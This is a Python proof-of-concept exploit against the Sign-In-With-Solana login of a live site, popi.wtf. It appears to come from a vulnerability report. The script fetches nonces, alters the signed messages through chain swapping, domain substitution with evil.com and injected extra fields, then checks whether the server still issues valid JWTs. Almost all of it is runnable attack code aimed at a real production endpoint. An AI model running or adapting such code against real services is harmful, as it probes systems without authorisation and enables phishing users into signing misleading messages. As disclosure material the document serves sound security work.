#!/usr/bin/env python3
"""
PoC: popi.wtf SIWS field injection — extra fields accepted in signed message

The /api/auth/verify endpoint does not reject SIWS messages that contain
additional fields beyond the standard SIWS fields. Arbitrary extra lines
appended to the message are accepted, producing a valid JWT.

This allows an attacker to append fake fields (e.g. "Bonus: 1000 SOL")
that mislead the victim about what they're signing.

Validated 10/10 on 2026-06-27.

NOTE: Chain confusion and domain non-validation were previously reported
and are reproduced here for completeness — they remain unfixed.

Run: python3 poc_siws_field_injection.py
Requires: solders, base58
"""
import json
import re
import time
import urllib.request
import urllib.error
from solders.keypair import Keypair
import base58

BASE = "https://popi.wtf"
HEADERS = {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0", "Origin": BASE}


def http_post(path, body):
    url = f"{BASE}{path}"
    data = json.dumps(body).encode()
    req = urllib.request.Request(url, data=data, headers=HEADERS, method="POST")
    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            return resp.status, json.loads(resp.read())
    except urllib.error.HTTPError as e:
        try:
            return e.code, json.loads(e.read())
        except:
            return e.code, {"error": str(e)}


def sign_message(keypair, message):
    return base58.b58encode(bytes(keypair.sign_message(message.encode()))).decode()


def test(name, modify_fn, runs=5):
    passed = 0
    for _ in range(runs):
        kp = Keypair()
        w = str(kp.pubkey())
        _, body = http_post("/api/auth/nonce", {"wallet": w, "chainId": "mainnet-beta"})
        if "message" not in body:
            continue
        msg = modify_fn(body["message"])
        sig = sign_message(kp, msg)
        status, _ = http_post("/api/auth/verify", {"wallet": w, "message": msg, "signature": sig})
        if status == 200:
            passed += 1
        time.sleep(0.5)
    return passed


def main():
    print("=" * 60)
    print("PoC: SIWS field injection + chain/domain gaps")
    print("=" * 60)

    tests = [
        ("Chain confusion", lambda m: re.sub(r"Chain: .+", "Chain: devnet", m)),
        ("Domain non-validation", lambda m: re.sub(r"^.+ wants you", "evil.com wants you", m)),
        ("Field injection (new)", lambda m: m + "\nFakeField: injected_value"),
    ]

    for name, fn in tests:
        ok = test(name, fn)
        print(f"  {name}: {ok}/5 {'VULNERABLE' if ok >= 3 else 'PATCHED'}")

    # Control: URI validation works
    kp = Keypair()
    w = str(kp.pubkey())
    _, body = http_post("/api/auth/nonce", {"wallet": w, "chainId": "mainnet-beta"})
    msg = body["message"]
    msg_bad = re.sub(r"URI: .+", "URI: https://evil.com", msg)
    sig = sign_message(kp, msg_bad)
    status, _ = http_post("/api/auth/verify", {"wallet": w, "message": msg_bad, "signature": sig})
    print(f"  URI validation (control): {'SECURE' if status != 200 else 'BROKEN'} (should be != 200)")

    print("\nNegative findings (confirmed):")
    print("  - URI must match https://popi.wtf")
    print("  - Version and Issued At required")
    print("  - Wallet must match signing key")
    print("  - Nonce single-use, replay blocked")
    print("=" * 60)


if __name__ == "__main__":
    main()